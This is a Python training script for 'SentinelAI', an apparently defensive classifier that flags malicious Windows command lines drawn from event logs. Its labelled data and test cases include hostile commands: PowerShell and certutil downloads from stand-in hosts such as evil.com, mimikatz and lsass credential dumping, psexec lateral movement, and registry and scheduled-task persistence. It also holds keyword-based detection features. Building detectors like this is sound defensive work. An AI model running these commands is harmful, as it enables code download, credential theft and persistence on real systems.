# update_training.py
# SentinelAI - Atualiza o modelo com dados reais extraidos dos EVTX
# Uso: python update_training.py

import os
import sys
import json
import joblib
import numpy as np
from scipy.sparse import hstack, csr_matrix
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import CountVectorizer
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report

from app_config import load_app_config

# ============================================================
# PATHS
# ============================================================

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

APP_CONFIG = load_app_config(__file__)

REAL_DATA_FILE  = os.path.join(BASE_DIR, "training_data_real.json")
MODELS_DIR      = APP_CONFIG["models_folder"]
MODEL_PATH      = os.path.join(MODELS_DIR, "security_model.pkl")
VECTORIZER_PATH = os.path.join(MODELS_DIR, "vectorizer.pkl")

# ============================================================
# DADOS SINTETICOS ORIGINAIS (normais + alguns maliciosos base)
# ============================================================

SYNTHETIC_DATA = [
    # === NORMAIS ===
    ("whoami", 0),
    ("hostname", 0),
    ("cls", 0),
    ("echo hello world", 0),
    ("date /t", 0),
    ("time /t", 0),
    ("ver", 0),
    ("dir C:\\Users\\Admin\\Documents", 0),
    ("dir C:\\Windows\\System32", 0),
    ("cd C:\\Users\\Admin\\Desktop", 0),
    ("mkdir C:\\Projects\\new_folder", 0),
    ("copy C:\\file.txt D:\\backup\\file.txt", 0),
    ("del C:\\temp\\old_file.txt", 0),
    ("type C:\\Users\\readme.txt", 0),
    ("ipconfig /all", 0),
    ("ping google.com", 0),
    ("ping 8.8.8.8 -n 4", 0),
    ("nslookup google.com", 0),
    ("netstat -an", 0),
    ("tracert google.com", 0),
    ("tasklist", 0),
    ("taskkill /IM notepad.exe /F", 0),
    ("systeminfo", 0),
    ("sc query", 0),
    ("net start", 0),
    ("notepad.exe", 0),
    ("explorer.exe", 0),
    ("calc.exe", 0),
    ("mspaint.exe", 0),
    ("chrome.exe", 0),
    ("firefox.exe", 0),
    ("winword.exe", 0),
    ("excel.exe C:\\reports\\q1.xlsx", 0),
    ("python.exe script.py", 0),
    ("python -m pip install requests", 0),
    ("git commit -m 'fix bug'", 0),
    ("git pull origin main", 0),
    ("git status", 0),
    ("code .", 0),
    ("npm install", 0),
    ("mvn clean install", 0),
    ("powershell Get-Process", 0),
    ("powershell Get-Service", 0),
    ("powershell -command Get-Date", 0),
    ("powershell Get-ChildItem C:\\Users", 0),
    ("powershell Set-Location C:\\Projects", 0),
    ("powershell Write-Host 'Hello'", 0),
    ("powershell Get-EventLog -LogName System -Newest 10", 0),
    ("net use * /delete", 0),
    ("chkdsk C: /f", 0),
    ("sfc /scannow", 0),
    ("dism /online /cleanup-image /restorehealth", 0),
    ("wuauclt /detectnow", 0),
    ("msiexec /i setup.msi /quiet", 0),
    ("robocopy C:\\src D:\\dst /e", 0),
    ("xcopy C:\\data D:\\backup /s /e", 0),
    ("attrib +r C:\\important.txt", 0),
    ("compact /c /s C:\\archive", 0),
    ("cipher /e /s:C:\\private", 0),
    ("net share backup=C:\\backup", 0),
    ("net view \\\\server01", 0),
    ("arp -a", 0),
    ("route print", 0),
    ("nbtstat -n", 0),
    ("netsh wlan show profiles", 0),
    ("sc start spooler", 0),
    ("sc stop wuauserv", 0),
    ("eventvwr.msc", 0),
    ("perfmon.msc", 0),
    ("devmgmt.msc", 0),
    ("diskmgmt.msc", 0),
    ("services.msc", 0),
    ("regedit.exe", 0),
    ("msconfig.exe", 0),
    ("mmc.exe", 0),
    ("wbemtest.exe", 0),
    ("winrm quickconfig", 0),
    ("gpupdate /force", 0),
    ("gpresult /r", 0),
    ("secedit /analyze", 0),
    ("auditpol /get /category:*", 0),
    ("wevtutil qe System /c:10 /f:text", 0),
    ("wevtutil qe Security /c:5 /f:text", 0),
    ("psr.exe /start /output C:\\log.zip", 0),
    ("mstsc.exe /v:server01", 0),
    ("putty.exe -ssh user@server", 0),
    ("winscp.exe /console", 0),
    ("7z.exe a archive.zip C:\\files", 0),
    ("winrar.exe a archive.rar C:\\files", 0),
    ("vlc.exe C:\\video.mp4", 0),
    ("mplayer.exe song.mp3", 0),
    ("acrobat.exe document.pdf", 0),
    ("outlook.exe", 0),
    ("teams.exe", 0),
    ("slack.exe", 0),
    ("zoom.exe", 0),
    ("java -jar app.jar", 0),
    ("dotnet run", 0),
    ("cargo build --release", 0),
    ("make install", 0),

    # === MALICIOSOS SINTETICOS BASE ===
    ("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATg==", 1),
    ("powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=", 1),
    ("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')", 1),
    ("certutil.exe -urlcache -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe", 1),
    ("mshta.exe http://evil.com/payload.hta", 1),
    ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()", 1),
    ("regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll", 1),
    ("wscript.exe C:\\Users\\Public\\malware.vbs", 1),
    ("bitsadmin /transfer job /download /priority high http://evil.com/a.exe C:\\temp\\a.exe", 1),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d C:\\malware.exe", 1),
    ("schtasks /create /tn backdoor /tr C:\\malware.exe /sc onlogon /ru SYSTEM", 1),
    ("wmic /node:192.168.1.50 process call create cmd.exe", 1),
    ("psexec.exe \\\\192.168.1.10 -u admin -p pass cmd.exe", 1),
    ("mimikatz.exe sekurlsa::logonpasswords", 1),
    ("procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp", 1),
    ("net user admin Password123! /add", 1),
    ("net localgroup administrators hacker /add", 1),
]

# ============================================================
# FEATURES MANUAIS
# ============================================================

def extract_features(commands):
    import re
    features = []
    for cmd in commands:
        cmd_lower = cmd.lower()
        f = [
            len(cmd),
            cmd.count(' '),
            1 if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', cmd) else 0,
            1 if '-enc' in cmd_lower or '-encodedcommand' in cmd_lower else 0,
            1 if '-nop' in cmd_lower or '-noprofile' in cmd_lower else 0,
            1 if '-w hidden' in cmd_lower or '-windowstyle h' in cmd_lower else 0,
            1 if '-exec bypass' in cmd_lower or '-executionpolicy bypass' in cmd_lower else 0,
            1 if 'iex' in cmd_lower or 'invoke-expression' in cmd_lower else 0,
            1 if 'downloadstring' in cmd_lower or 'webclient' in cmd_lower else 0,
            1 if 'http://' in cmd_lower or 'https://' in cmd_lower else 0,
            1 if any(x in cmd_lower for x in ['certutil', 'mshta', 'rundll32', 'regsvr32', 'wscript', 'cscript', 'bitsadmin', 'msiexec /q']) else 0,
            1 if any(x in cmd_lower for x in ['mimikatz', 'procdump', 'lsass', 'sekurlsa']) else 0,
            1 if 'net user' in cmd_lower and '/add' in cmd_lower else 0,
            1 if 'schtasks' in cmd_lower and '/create' in cmd_lower else 0,
            1 if 'currentversion\\run' in cmd_lower else 0,
            1 if any(x in cmd_lower for x in ['psexec', 'wmiexec', 'smbexec', 'impacket']) else 0,
            1 if any(x in cmd_lower for x in ['invoke-mimikatz', 'invoke-bloodhound', 'invoke-kerberoast']) else 0,
            1 if re.search(r'\b(cmd|powershell)\s*/c\s+.{30,}', cmd_lower) else 0,
            1 if cmd_lower.count('\\') > 4 else 0,
            1 if any(x in cmd_lower for x in ['temp\\', 'tmp\\', 'appdata\\local\\temp']) else 0,
        ]
        features.append(f)
    return np.array(features)

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 55)
    print("  SentinelAI - Atualizacao do Modelo com Dados Reais")
    print("=" * 55)

    # 1. Carregar dados reais
    if not os.path.exists(REAL_DATA_FILE):
        print(f"\n[ERRO] Ficheiro nao encontrado: {REAL_DATA_FILE}")
        print("       Corre primeiro: python extract_training_data.py")
        sys.exit(1)

    with open(REAL_DATA_FILE, encoding="utf-8") as f:
        real_data = json.load(f)

    print(f"\n  Dados reais carregados : {len(real_data)}")
    print(f"  Dados sinteticos       : {len(SYNTHETIC_DATA)}")

    # 2. Combinar tudo
    commands = []
    labels   = []

    # Sinteticos
    for cmd, label in SYNTHETIC_DATA:
        commands.append(cmd)
        labels.append(label)

    # Reais
    for item in real_data:
        cmd = item.get("command", "").strip()
        if cmd and len(cmd) >= 5:
            commands.append(cmd)
            labels.append(item.get("label", 1))

    maliciosos = labels.count(1)
    normais    = labels.count(0)
    total      = len(commands)

    print(f"\n  Dataset final:")
    print(f"    Total     : {total}")
    print(f"    Maliciosos: {maliciosos}")
    print(f"    Normais   : {normais}")
    print(f"    Ratio     : {maliciosos/normais:.1f}x mais maliciosos que normais")

    # 3. Vetorizar
    print("\n  A vetorizar comandos...")
    vectorizer = CountVectorizer(
        analyzer='char_wb',
        ngram_range=(2, 4),
        max_features=8000
    )
    X_text   = vectorizer.fit_transform(commands)
    X_manual = csr_matrix(extract_features(commands))
    X        = hstack([X_text, X_manual])

    # 4. Split
    print("  A dividir dataset (80/20)...")
    X_train, X_test, y_train, y_test = train_test_split(
        X, labels, test_size=0.2, random_state=42, stratify=labels
    )

    # 5. Treinar
    print("  A treinar RandomForestClassifier...")
    clf = RandomForestClassifier(
        n_estimators=300,
        random_state=42,
        class_weight='balanced',
        n_jobs=-1
    )
    clf.fit(X_train, y_train)

    # 6. Avaliar
    print("\n--- Avaliacao do Modelo ---")
    y_pred = clf.predict(X_test)
    print(classification_report(y_test, y_pred, target_names=["Normal", "Malicioso"]))

    # Cross-validation
    print("  Cross-validation (5-fold)...")
    scores = cross_val_score(clf, X, labels, cv=5, scoring='f1_weighted', n_jobs=-1)
    print(f"  F1 medio: {scores.mean():.3f} (+/- {scores.std():.3f})")

    # 7. Guardar
    os.makedirs(MODELS_DIR, exist_ok=True)
    joblib.dump(clf, MODEL_PATH)
    joblib.dump(vectorizer, VECTORIZER_PATH)
    print(f"\n  [+] Modelo guardado em   : {MODEL_PATH}")
    print(f"  [+] Vetorizador guardado : {VECTORIZER_PATH}")

    # 8. Teste rapido com comandos conhecidos
    print("\n--- Teste Rapido ---")
    test_cases = [
        ("powershell -nop -enc JABzAD0ATg==",                          "MALICIOSO"),
        ("certutil.exe -urlcache -f http://evil.com/a.exe",            "MALICIOSO"),
        ("mimikatz.exe sekurlsa::logonpasswords",                      "MALICIOSO"),
        ("psexec.exe \\\\192.168.1.10 -u admin -p pass cmd.exe",       "MALICIOSO"),
        ("notepad.exe",                                                 "NORMAL"),
        ("dir C:\\Users",                                               "NORMAL"),
        ("python -m pip install requests",                             "NORMAL"),
        ("git pull origin main",                                       "NORMAL"),
    ]

    from train import predict
    for cmd, expected in test_cases:
        result = predict(cmd)
        status = "OK" if result["label"] == expected else "FAIL"
        color  = "MALICIOSO" if result["label"] == "MALICIOSO" else "NORMAL"
        print(f"  {status} [{color}] ({result['confidence']}%) -> {cmd[:55]}")

    print("\n  [+] Modelo atualizado com sucesso!")
    print(f"  Dataset: {total} amostras ({maliciosos} maliciosas reais+sinteticas, {normais} normais)")

if __name__ == "__main__":
    main()
